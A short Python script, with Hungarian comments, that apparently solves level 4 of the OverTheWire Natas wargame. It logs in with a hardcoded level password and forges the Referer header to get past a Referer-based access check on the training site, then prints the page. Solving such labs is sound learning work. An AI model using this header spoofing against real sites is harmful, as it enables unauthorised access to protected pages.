from urllib import response
#3.9 pythonnal megy!!

import requests
import re

username = 'natas4'
password = 'tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm'

headers = {"Referer": "http://natas5.natas.labs.overthewire.org/"}

url = 'http://%s.natas.labs.overthewire.org/' % username

reponse = requests.get(url, auth=(username, password), headers=headers)
content = reponse.text

#keresés a tartalomban. A (.*) a helyettesítő karakter. ami itt van az eredetiban azt figyelman kívül fogja hagyni.
#print(re.findall('natas3:(.*)' ,content))

print(content)